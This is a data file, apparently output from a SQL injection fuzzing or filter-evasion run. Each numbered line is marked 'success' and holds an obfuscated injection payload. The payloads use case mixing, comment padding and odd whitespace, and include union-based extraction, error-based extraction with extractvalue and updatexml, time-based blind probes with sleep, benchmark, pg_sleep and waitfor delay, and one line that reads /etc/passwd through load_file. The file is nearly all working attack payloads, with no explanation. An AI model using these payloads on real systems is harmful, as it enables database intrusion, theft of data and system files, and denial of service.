0 success "0x1%'   )    )    union all\x0bSeLEcT null,null# "
3 success "1'\xa0  )    )    as stnn WhErE 0x1810  =  6160 And 8881   lIke   7347-- "
7 success "1'/**/WhERE 9778<>9779 AND\t'G'!='GU' "
8 success "(SELECT 1)%'/**/union all select null,null,null#/**/"
9 success "1'\t )   as tygi where 9891   LIKE   9891 AND True && row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  (SELECT 6237)  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0 \x0b)  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  -- "
11 success '0x1"   ) /**/  )    as xwrq where 4161\x0b  LIKE   4161 AND \'T,\'!=\'T,>\' AND 1/**/'
12 success "0x1'   )    )/**/    )  \nor (SELECT 2633)  =  dbms_pipe.receive_message  (/**/ chr  (  112  )  ||chr  ( \n65  )  ||chr\t (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'xwhi'  =  'xwhi "
13 success "0x1%'  )   procedure analyse  (  extractvalue  (  9255,concat /**/(  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )   /**/)     )  ,1  )   and   (  '%'  =  ' "
15 success "0x1%'/**/AND 2006/**/ = \x0b2006/**/"
19 success "1'+/**/\x0b(  select dpkp where 4836  = \xa04836 and sleep  (  5   )    )   +' "
22 success "sELEcT pg_sleep  (  0x5  )   aND  \x0c (    (   'vxxg'   like   'vxxg "
28 success "(SELECT (SELECT 1))'   )  /*<I*/\n)  \t union all select null,null,null,null,null,null# "
29 success 'eNd AnD    (    (   (SELEcT 0x870)  =  2160 '
30 success "-6220' union all select/**/0x5b6,1462# @~"
32 success "(seLeCT (SELECT 1))' /**/ )   \x0c)     )   and\x0b3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/0x2   )    )      )    )  \x0c/**/and    (    (     (  'isyg'  =  'isyg "
36 success '(SELECT 1)" wheRE 9842=9842 AND True OR 2878=0xb3f OR/**/\'13UC\' LIKE \'13UCX\' '
38 success '0x1%"  )   AND 8635   LIke     (  SelEct count\t (  *  ) /*J;\\+_*/ FROM generate_series  (  1,5000000   )    )   -- '
39 success '(SELECT 0x1)  )   union\x0call/**/select null,null,null,null,null,null-- '
41 success ' SeLECt * FroM users WheRe id  =  1 Or ".  )  " Or \'6=\'=\'6=\' Or/*N*/False -- 1 V>'
42 success "0x1'||  (/**/\nselect 'svnn' FrOm/**/dual whEre 8710   LIkE   0x2206 oR 0 "
43 success '0x1"  )   anD sleep  (  0x5  ) /**/# l'
44 success '0x1\t )   AS bpap wHERE 7656<>7657 AND True Or 4240   like     (  seLeCt 4240 FrOM pg_sleep  (  (SELECT 5)   )   /*^*/)\n/**/ -- '
47 success "0x1,  (  SeLecT   (  case WHEn   (  'N' not like 'Nd'  )   THen 1 elSe cast  (  1 aS int  )  / \xa0(  SeLEcT 0 fROm dual  )   enD  )   FroM dual  )   "
48 success 'selEcT   (  CAsE WHEn   (  9393   LIkE   5530  )   THEN 9393 elSE cast  (  1 as int  )  //**/ (  SElEcT 0 frOM dual  )   ENd  )   FrOm dual-- \x0b'
49 success 'sEleCT   (  cASe\twHEN   (  8993   LIkE   8846  )   tHen 8993 elsE 8993*  (  sElEcT 8993 From mysql.db  )   ENd  )  # '
53 success "-0x25b5'  )  \nwhere 7505 IN (7504,7505,7506) or/**/2180!=2181 and 6931 IN (6930,6931,6932)# "
58 success '0x1   )   /*Z.3H*/)    as\x0cxzcl WHeRE 0x91c   LIKE  /*Zy*/2332 '
59 success "(SeLecT 0x1)  ) \t whERE '\\' NOT LIKE '\\.' or 1022  =   /*(SELECT 5)'I8*/(  sElEct count  (  *  )   FRom all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
61 success "/**/or 'something'    LIKE    'some'+'thing' "
63 success "(SELECT (SELECT 1))%'   )    )    rlike   (  select   (  case/*x*/when   (  'i'!='iY' \n)   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ' "
70 success "(sElECT (sELECt 0x1))  )   WHeRe 'aU#B'\x0bLiKe 'aU#B' OR False Or 7552  =    (  SELecT count  (  *  )   froM rdb$fields AS t1,rdb$types aS t2,rdb$collations as t3,rdb$functions AS t4  )  -- "
71 success ' SELect * FrOM users wHerE id   LiKE\t  0x1 or 1#"? union SElECT null,version  (    )   -- 1 '
72 success 'SelecT/**/'
76 success '0x1%"   )    )  \x0c or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  0x41  )  ||chr  (  103  )  ,5  )   and    (    (   "%"  =  " '
79 success '(SeleCt 1)\n )   As bfuy whERe 0x157a<>5499 aND char  (  107  )  ||char  (  121  )  ||char  (  (SELEcT 97)  )  ||char  (  80  )    =  regexp_substring  (  repeat\n (  lEFt  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000/**/ )  ,null  )  -- "dM'
80 success '0x1\norder\x0bby/*5/\'E"*/0x1-- '
81 success '0x1%" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns/**/as t2,domain.tables as t3  )   and "%"  =  " '
85 success ' sELect * FrOm users wHErE id  =/*T6*/ (SeLecT 1) || 1#"1 union SeLeCt \'a\',version  (    )   -- 1 '
87 success '0x1"   )    )    union all select null,null,null,null,null,null,null,null,null-- '
89 success '(SELECT 1)  )   WHEre 6636 In (6635,6636,6637) '
90 success "-(SELECT 3499)'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  ) /**/+char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  'qkA'!='qkA.'  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap "
91 success 'if  (  0xe09  =  0xec3  )   select\x0b0xe09 else drop function qtqy-- '
92 success "0x1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840 || False  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,(SELECT 1)  )   "
93 success '0x1"   )    )    /**/)   '
95 success "-4699  )   As mymz wHerE 'Xp'<>'Xp]' || elt  (  1032 /**/=  1032,3623 \t)  -- B"
96 success ' SELEct * frOM users WHERe id  =/**/ 0x1 OR 1#"{ union SElECt null,version  (    )   -- 1 '
98 success '0x1%"   )    )    /**/)   union all SELeCt null,null,null,null,null,null# R'
100 success '0x1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   '
101 success "0x1 where '>n(('/**/not/**/like '>n((7'/**/"
102 success "1'/**/where\t0x109d\x0c/**/= /**/0x109d\n"
103 success '(sElECt 1)" wheRE\n0x1a5f lIKE 0x1a5f Or 0\t'
105 success '0x1"   )    )\x0c   or 4411  =    ( /*\nBqy\t*/select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   "pmmr"  =  "pmmr '
108 success "-4828'+  ( /**/SElECT qxnw WheRe 1229 NOT LIKE 1230 union all SeLeCt 9488,0x2510-- "
109 success '-6381%"/**/  )    )     )   union all SeLecT 1503,0x5df,1503,1503# hu'
111 success "0x1'   )    )    as xqvq where 4816  =\x0b 4816 or 4240   like     (  select 4240 from pg_sleep  (  5   )    )   -- "
112 success '0x1" order by\t1# '
114 success "(SELECT 0x1)' where 0x146e  \x0bLIKE   0x146e OR/*:\n*/'H'='HT' "
117 success '0x1  )   || 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  -- p'
118 success "SelecT count\x0c (  *  )   fROM sysibm.systables\nAs t1,sysibm.systables as t2,sysibm.systables As t3 AnD    (   /*jR}\rE*/(     (  'vcgc' Like 'vcgc "
122 success "1'\t )   where 'D'!='Dk' "
131 success 'sELeCt liKe  (  \'abcdefg\',upper  (  hex  (  randomblob  (  (SElECt 500000000)/(SELECT 2)   )    )      )    )    aNd    (    (   "nxvp"  =  "nxvp '
135 success 'SeLECt count  (  */**//**/)   from domain.domains AS t1,domain.columns As t2,domain.tables As t3# kuqm '
137 success ' having 0x1   LIKE /**/ 1-- '
139 success '0x1"  ) /**/ AS rcnk/**/Where 1800  =  1800 OR 2704 NOT IN (2703,2704,2705) '
140 success "(selecT 0x1)%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  ' "
144 success "0x1' or 8466/**/ =  benchmark  ( /**/5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru "
145 success 'seLECT count  (  */**/ )   FroM generate_series  (  1,5000000  )   And  /**/ (    (   7240   LIkE   7240 aNd True '
148 success 'sELeCT\x0b* fRoM generate_series  (  9058,(SelecT 9058),caSe WHEn   ( \x0c9058   LIke   1183  )   THEN 1 eLse 0 enD/**/ )   limit (select 1)-- '
149 success "1'+  (  select mkbv where '-00' NOT LIKE '-00w' And 9254/**/ =    (  sELEcT count  (  *  )   FRoM rdb$fields aS t1,rdb$types As t2,rdb$collations as t3,rdb$functions As t4  )  -- y"
150 success "sElEcT count  (  *  )   FRom generate_series  (  (SELECT 1),5000000  )  /**/and   (  'qpdu'  =\t 'qpdu "
153 success "0x1' or char  (  117\t )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )   or char  (  69  )  ||char /**/(  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   "
154 success '(SELECT 1)" WHere\x0b0x1ec7   LIKE  \t0x1ec7\x0c'
155 success '1 WHEre 8322 LIKE 8322 aND True anD 2716  =    (  selEct count  (  *  )   FRom sysusers aS/**/sys1,sysusers As sys2,sysusers As sys3,sysusers AS sys4,sysusers as sys5,sysusers aS sys6,sysusers aS sys7  )  -- '
156 success '(SELECT/**/1)"  )   wHERe 1494 LIke 1494 And \'*T\' NOT LIKE \'*Tb\' aND 1 AND 0x1 oR 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  0x57  )  ||chr  (  90  )   Or chr  (  109  )  ,5  )  -- '
157 success "(SELECT 1)%'/*Q56*/union all\tseleCt null,null,null-- CAh"
158 success "(SELECT/**/0x1)'   )    )    as/**/xkiq where 0xd8a NOT LIKE 0xd8b and sleep  (  5  )  -- F"
159 success "-0x7ec'   )    )     ) \n union all select/**/8698,8698,8698,8698# a\\sp"
162 success 'oR 1/**/  LIKE   1/* '
164 success "0x1'||  (/**/ select 'hwdj' wHerE 0x1ff3   LikE   8179 Or False "
168 success '(SELECT 1)" Where 7796   lIke  \x0b7796 '
170 success "0x1'||  (  select 'scwx' where (SELECT 6591)  = /*=4DO*/(SELECT (SELECT 6591)) and 3824  =  benchmark\t (  5000000,md5\n (  0x76555642 \x0c )    )     )  ||' "
173 success 'SeLeCt benchmark  (  (sEleCT/**/0x4c4b40),md5  (  0x4c4d6142/**/  )    )  /**/ AnD   (  "%"  =/*S3&O*/ " '
175 success "-(SELECT 6500)'   )    )    or   (  '{.'='{.'  )  *4906 and    (    (   'padu' like 'padu "
176 success "0x1' or   (  select 2* /**/(  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  ' '!=' +',1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and 'nazb'  =  'nazb "
179 success "(selECt 1)'/**/ )\x0c  as rhvm WHERE 9322 LIKE 9322 OR 0 "
181 success '0x1  )   or elt/**/ (  6272  =  6272 AND True,sleep  (  (SELECT 5)   )    )    and   (  8600  =  (SELECT 8600) '
183 success 'select case when 0x15b7  /**/like   3483 then 1 else null end--\t'
185 success "0x1'+  (  select 'tmel' where 2655  =  2655 OR 4693 LIKE 4694 rlike   (  select   (  case when   (  2118  =  8500  )   then/**/1 else 0x28 end   )    )     )/**/ +' "
186 success 'SELECT sleep  ( \t(sELECT 0x5)  )   And    (    (     (  "lczw"  =  "lczw '
188 success '(SELECT 0x1)\x0c  )    )    union all seleCT null,null,null,null,null,null,null,null-- $l'
190 success '(SELECT 1) /**/ )   /**/)  '
193 success '0x1" and 5556/**/ =    (  select count  (  *  )   from all_users t1,all_users/**/t2,all_users t3,all_users t4,all_users t5  )   and "epxq" like "epxq '
194 success ' select * from/**/users where id  =  1 <@. union select 1,version  ( \t  )   -- 1 '
195 success "1'+  (  select bgbq where 1589  =  1589 and (SELECT 3715) in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )\x0c +char  (  113  )  +  (  select   (  case when   (  3715  =  3715 OR False  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +' "
196 success "(SELECT (SELECT (SELECT/**/1)))' union all select null,null,null,null,null,null,null,null# "
198 success '0x1" procedure analyse  (/**/ extractvalue  (  9255,concat  (  0x5c,  (  benchmark  ( \t(SELECT 5000000),md5  (  0x52515a50   )    )      )    )     )  ,0x1  )   and "onsd" like "onsd '
199 success 'seLEcT * fRoM users where id  =  1 || \\<   =  1 Or 605 LIKE 605 AND 0x1 -- 1 0'
204 success "-0x20da'   )\t   )     )   Or 8571/**/  LikE   8571-- "
207 success "0x1 WhEre 5332  =  5332 OR False ||   (  sElect 9173 From  (  sELECt count/**/ (  *  )  ,concat  (  0x7171706a71,  (  seLECT   (  elt  (  9173 \x0c=  9173 ANd 'B'<>'Bk',1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2\t  )    )   x fRom information_schema.character_sets group by x  )  a  )  -- m"
208 success "1'/**/In boolean mode  )   ANd sleep  (  (sELEcT (SELECT 5))  )  #\x0cp7+#"
209 success '(SELECT 1)" whEre 2642  =  2642 AND 210 like 0xd2 anD 587 Like 587 OR 8315   lIKE     (  sElEcT count  (  *  )   FRoM sysibm.systables aS t1,sysibm.systables\x0baS t2,sysibm.systables as t3  )  --\xa0'
211 success ' end && "%"  =  " '
212 success "1'+  (  SELECt yjyp WheRe 9696  =  9696 "
215 success "1'\x0c  )  \xa0 )  /*rC).*/ as tcby where '+}K>'!='+}K>D' "
216 success "0x1%'  )   or (SELECT 8315)  =    (  select count  (  *  )  /**/from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  \nand   (  '%'  =  ' "
217 success "Select sleep/**/ (  5  )   ANd    (    (   \x0b (  'iwwa'/*_*/liKE\t'iwwa "
218 success "(SELect (SELECT 1))'||  (  select\x0c'pzoe' where 'm' LIKE 'm' and True && elt  (  3114  =  (SELECT 3114),sleep  (  0x5/**//**/ )    )   # _M}"
222 success "0x1' WhERe 0xa65  =\x0c 0xa65 aND/*.**/True "
226 success "(SELECT 0x1)' in boolean mode  ) /*^v#*/ and/**/5725   LIKE   5552# "
227 success 'sElEct */**/FroM users whERe id  =  1 +   (  \\+  )   or 1  =  1 -- 1 '
229 success '0x1" /**/)   and make_set  (  (SELECT 8403)  =  (SELECT 8403) AND \'X&q*\'=\'X&q*\' AND True OR False,8899  )   and   (  "akha" like "akha '
230 success ' (  selECt  \t(  CASE WHen   (  1570   LIke   6977  )   tHen 1 elSe 1570*  (  Select 1570 fROm mysql.db  )   eND   )    )  '
232 success "0x1'  )   union all sElecT null,null,null,null,null,null-- "
233 success "(SELECT (SELECT 1))   )    )     )/**/  AND (SELECT 3824)  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (   /**/( \x0c   (  'm8' NOT LIKE 'm8P' "
236 success '0x1"  )  /**/and make_set  (  4539\xa0 =  6401,6401  )   and   (  "kglx"  =  "kglx '
237 success '(SELECT 0x1) union all select null,null,null,null,null,null,null,null# '
238 success "1'+/**/\xa0(  select 'tjvt' where 2463   LIKE   2463 "
239 success '0x1"   )    )/**/   aS xbhp wHerE 0x1d67   liKe   7527 '
242 success 'select pg_sleep \x0c(  5/**/ )   AND "%"  =  " '
243 success "0x1' rlike sleep  (  5 \n) /**/#  &"
246 success 'SELeCT sleep  (  5  )   AND    (    (   8679  =  8679 oR False aNd 0x1 oR 8578=8579 '
250 success "0x1'  )   where 8211   LIKE   8211 union all select null,null,null,null,null# "
251 success "(sELecT (SELECT (SELECT 1)))'   )    )     )   oR 0x93f   LIKE     (  SeleCT count /**/(  *  )   fRom rdb$fields aS t1,rdb$types as t2,rdb$collations\xa0AS t3,rdb$functions aS t4  ) \x0c-- "
252 success "1'\x0c  )    )     )   rlike   (  Select * FRoM   (/*C*/ sEleCt  (  sleep  ( \t5   )    )     )  vwyq\n )  #\nc"
254 success "(SELECT 0x1)' where ')' NOT LIKE ')z'  OR  8466   lIkE   benchmark\x0c (/**/ (SelecT 5000000),md5  (  0x694a4745   )    )   -- "
255 success ' selECT * fROM users WHERE id/**/  lIkE   \'1\' union seLect $["],@@VERSION -- 1\' ~d'
256 success 'select\t* from information_schema.tables-- 0x0`'
259 success 'seLecT   (  CASE WHeN   (  5704  =  4125  )   ThEn 5704 eLsE cast  (  (SELECT 1) As int  )  /  (  sELEct 0 From dual  )   eNd  )   fRom dual-- '
260 success '0x1  )   aS cejp\x0cWHeRE 4736  =  4736 AND True Or False Or 5286  =    (  SelecT count  (  *  )   fRoM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- '
264 success "0x1' in boolean mode /**/)   rlike   (  sELEcT * frOM   (  SELECT  (  sleep  ( \n0x5   )   \xa0)  /*J\rHJQ*/  )  sgvo  )  # "
265 success "0x1'+  (\xa0 select somn where 'm8ET('<>'m8ET(;' OR 'J' LIKE 'Jl' rlike sleep  (  5   )    )   +' "
266 success "0x1'||  (  select 'svbf' where 7017  =  7017 or elt  (  'x' LIKE 'x',sleep  (  (SELECT 5)   )    )     )  ||' "
267 success '(SELECT 0x1) /**/ )    )    union all select null,null,null,null-- '
269 success ' SElECt * fRom users WHERe id  =  0x1 Or "1{" Or \'`\' NOT LIKE \'`/\' -- 1 '
270 success '0x1"   )    )    as wnzf where 0xd18 /**/ LIKE   3352 or char  (  117  )  ||char  (  111 \t)  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left/**/ (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- '
271 success "1'+  (  select zbyt where 355=355 AND 9753 NOT LIKE 9754 or row  (  0x415,7562  )  >  (  select/**/count \x0b(  *  ) /**/,concat  (  0x7171706a71,  (  select  \t(  elt  (  '>u'!='>u3',(SELECT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x   )    )   +' "
272 success "0x1'||  (  select 'mlwj' from dual where 4247  =  4247 AND 6264=6264 AND 1 AND 1 and/**/1702  =  8469 \t) \t||' "
273 success '0x1"  \x0b)    ) /*~]bM*/ /**/\x0c)   oR sleep  (  5  )  # &'
276 success '0x1" where 0x652  =  0x652 || 0x1fdc  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   -- '
277 success "0x1'||  (  select 'zqwd' where 9923=9923 OR 0 rlike\tsleep  (  5   )    )   ||' "
280 success "1'+  (  select ijck where 9961  =  9961 OR 'v'<>'v' or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (\t select   (  elt  (  (SELECT 8113)  =  8113,1   )    )     )  ,0x717a767a71,0x78  /**/)    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +' "
282 success "0x1' aND elt  (  2254<>2255 OR 0,7259 /**/)   "
283 success "(SELECT 1) WHerE 7362   Like   7362 aNd (sElecT 8148)   LIKE   LIke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- \n"
286 success "1'+  ( /**/select aahc where (SELECT 5436)  =  0x153c AND 2223 LIKE 2223 OR False and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )   \n) \x0c   )  +' "
294 success "-2806'   )    )     ) /**/ or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  0xaa4  =  2724 AND '1'<>'1N'  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )  /**/ )     )   and    (    (     (  'rxzr'  =  'rxzr "
295 success "0x1' && updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393   LIKE   3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   "
296 success "0x1'||  (  select 'zqdn' WherE 0x1832   liKE   0x1832/**/union all SELEct null,null,null,null-- "
298 success "-4256'  )   Where 9545   lIKE   9545 OR 0x139f  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sEleCT   (  cAsE WhEN   (  5023  =  5023  )   theN 1 ElsE 0 end  )   FROM dual  )  ||chr  (  113  )   oR chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )   oR chr  (  113   )    )     )  -- "
299 success "(sEleCt 0x1)'  ) \x0c and (SELECT 8514)  =    (  select count \t(/*LPezx*/ */**/ )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'vgkt'  =  'vgkt "
300 success "0x1'  )   || sleep/**/ (/**/ 5  )  "
301 success "1'\xa0 )   union all select null# JP\x0c,"
302 success "0x1'||  (  select 'xugb' from dual where 'kbH-'='kbH-' "
303 success ' SeLEct *\tFrom users WhErE id   LIKE   1\xa0OR 0x1#"$ union SelECt \'a\',version  (    )   --/**/(SELECT 1) '
304 success "1'/**/  )    )    as qcgf where 4171 NOT LIKE 4172 or 0x14ec  =    (  select/**/count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  -- "
305 success "SELeCt * FrOM users WHERe id   LIKE   '1' Or $<\\ Or 1  =  (SELECT 1) -- 1' nZ"
306 success '0x1" \x0b)   where 0x2420   LIke \x0b 0x2420/**/'
308 success "(SeLEcT 0x1)%'   )    )     )   Or   (  SElecT * fRoM   (  SElEcT  (  sleep  (  (SELECT 5)   )    )     )  sddo  )  # "
311 success ' SELecT * FrOm users wheRe id  =  1 Or ";#" OR 1  =  1 -- 1 '
313 success "1'+  (  SEleCT taga WhErE 8036  =  8036 AND 'Ct5' LIKE 'Ct5' AND 1 "
316 success ' (  SElEcT   (  Case wHEn   (  6035   LikE   9882  )   THEn\x0b6035 ElSE 6035*  (  selEcT 6035 FRom mysql.db\x0b )   End   )    )  '
317 success '0x1"   )    )    As iubt whEre 8179  =  8179 AND 5784<>5785 AND 1 AND \'r\'<>\'rr\' Or (sElEcT 9643)   LIkE  \x0b  (  sELEcT count  (  *  )   frOM domain.domains aS t1,domain.columns AS t2,domain.tables As t3  )  -- '
318 success "(SElEct 1)'+\t (  SelEcT gqez wHerE 3704   lIKe   3704 AnD True "
321 success "1/**/ )   where 'g'!='gV' "
326 success '(selEct (SELECT 0x1))" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  \'\rf5\' NOT LIKE \'\rf5]\',(SELECT 1)   )    )     )  ,0x717a767a71   )    )    and "ymwb"  =/*\t+O*/ "ymwb '
330 success '0x1%" /**/)   aND 2303 LiKe 2303-- '
331 success '0x1"   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  6105 IN (6104,6105,6106)  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (\t  "fkip"  =  "fkip '
334 success "-3775'/**/ )   as rqet where 7092   LIKE   7092 or elt  (  1032  =  1032,3623  )  -- lm"
335 success "/**/union select 1,load_file  (/**/ '/etc/passwd'  )  ,1,1,1; "
336 success '(SELECT 1) OR 8466\x0c  like   benchmark  (  5000000,md5  (/**/ 0x694a4745   )    )   # irvm '
337 success "-2855' union all/**/select 2495,2495,2495,2495,2495,2495,2495,2495,2495--/**/~"
339 success '(SELECT 1)\t )   aS mixt whERE 1539!=1540 AND 7059<>7060 Or 0 OR sleep  (  5  )/**/ -- r{'
340 success "(seleCt 0x1)'  /*p*/)    )    AnD 0x25bc   LIke     (  sElECT count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- "
344 success "0x1\x0b  )   \x0c)   /**/AS fpej WhEre 6790   lIkE   0x1a86 aND '&E' NOT LIKE '&Ed' anD   (  3020 \xa0=  3020 OR 9422 LIKE 9423 oR 6096 likE 6097  )  *6703-- I[J;"
345 success "call/**/regexp_substring \x0c(  repeat  ( /**/right  (  char /**/(  3702  )  ,0  )  ,500000000  )  ,null/**/ )   AND  \n(  'cixa' LIKE 'cixa "
346 success '0x1%" and 2805   LiKe   0x541 '
347 success "1'\tprocedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  6448 like 6448  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   "
352 success '%0x1b oR 2321\tIn (2320,2321,2322) '
354 success "1'/**/  )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  749 IN (748,749,750) OR 725=726 AND 1,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (  \n (     (  'gwew' like 'gwew "
355 success '(SELECT (SELECT 1))%"   )    )   /**/ )\x0b  oR 7417   like     (  SelecT count  (\x0c *  )   FRom sysibm.systables As t1,sysibm.systables as t2,sysibm.systables As t3  )  -- '
356 success "-9509'   )    )     )   or 1091  =  0x1565 and    (    (     (  'gsmz'  =  'gsmz "
359 success "1'+  (\x0c SeleCT oogh Where 1167/**/ =  1167 OR elt  (  2622!=2623,sleep  (  5   )    )   # "
360 success "(selEcT (SELECT 1))'/**/in boolean mode  )  \x0bAnD (SELECt 9198) /*MT*/=  9198-- n"
363 success "1'/**/ )   whERe 1093  =  1093 aND extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  seLECt   (  elt  (  7982  =  7982 AND 9434 IN (9433,9434,9435) AND 6378 LIKE 6378 OR False,1   )    )     )  ,0x717a767a71   )    )   -- "
364 success '(seleCt (SELECT 1))""  (  .\'.  (\t ,  (\t . '
367 success '\x0c(  sELEcT   (  cASe wHen   (  1421  =  1421  )   ThEn 1 Else 1421*  (  SelECT 1421 FrOM master..sysdatabases  )   End   )    )  '
369 success "(SElecT (SELECT 1))%'   )    )  /**/  )   and (SELECT 0xe7b)  =    (  select count  (  *  )\xa0  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (\xa0   (     (  '%'  =  ' "
370 success "1'+/**/ (  select gthp where 7311  =  7311 or sleep  (  5  )  # Gj"
371 success '(SELECT (SELECT 1)) \x0b )    )     )   union all select/**/null,null,null,null,null,null,null,null,null,null-- v'
374 success '-0x19c7%"   )    )    or make_set  (  \'Od[\'<>\'Od[,\' AND True,0x1c11  )   and    ( \x0c/*p;P@|*/ (   "%"  =  " '
376 success "0x1' && (SELECT 2716)  =    (  select count  (  *  )   from\nsysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  ) /**/-- "
377 success '0x1\x0b )   AnD\x0b(SELECt 8514)   like     (  SeleCT count  (  *  )   fROM domain.domains As t1,domain.columns as t2,domain.tables AS t3  )   '
378 success 'sELecT   (  CasE whEN   ( /**/7217   Like   7631  )   tHEn 0x1c31\nelSE (SeLECt 7217)*  (  selEct 0x1c31 FroM information_schema.character_sets  )   End  ) \t# GN<'
379 success "SELeCT * FrOm\x0cusers WhERe id  =  '1' *$ 1 oR 1  =/**/ 1 -- 1' "
387 success '0x1" wHeRE \' OV\'/**/likE \' OV\' order by\x0b0x1-- x'
389 success 'waitfor delay \'0:0:5\'\x0band   (/**/ "dmcu"   LikE \t "dmcu '
390 success "(SELECT/**/1)%' union all/**/SElECt null,null,null,null,null,null,null,null,null,null#  like p"
391 success "0x1'||  (  select 'lljg' from/**/dual where/*v*/0x7c3<>0x7c4 AND 's' LIKE\t's' And True "
392 success "0x1  ) \x0b aS wype WHERE 6570 LIKE 6570 AND 'T' LIKE 'T' || (sElEcT (SELECT 0x207b))   LIKE     (  SELeCt count  (  *  )/**/  FRoM sysibm.systables as t1,sysibm.systables As t2,sysibm.systables AS t3  )  -- "
394 success "1'+/**/ (  select 'vabj' wheRE 7178  =  7178 OR 0 OR 6000=6001 union all SeLEct null,null,null,null,null# "
397 success '0x1,  (  SELECT   (  caSe WheN   (  8653 NOT LIKE 8654 AND 271 IN (270,271,272) Or 0  )   then   (  seLect count  (  *  ) /*P*/ frOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   ELse (selecT 1)/  (  sELeCT 0 FRoM dual  )   end  ) \x0c fRoM dual  )   '
398 success "-9860/**/ )   where '(L' not like\n'(L^' union all select 8743,8743,8743,8743,8743,8743,8743-- j"
399 success "SELeCt count  (  *  )   frOm generate_series  (  0x1,5000000 \x0b)   aND    (    (     (  'ldqq'   LIKE   'ldqq "
401 success 'seLeCt benchmark  (  5000000,md5  (  0x4c4d6142   )    )    And    (    (     (  9847   LIKe   9847 '
404 success '1/**/ )   where 2348=2348 AND True OR 0 and 0x25bc  \nLIKE     (  select\tcount  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- ('
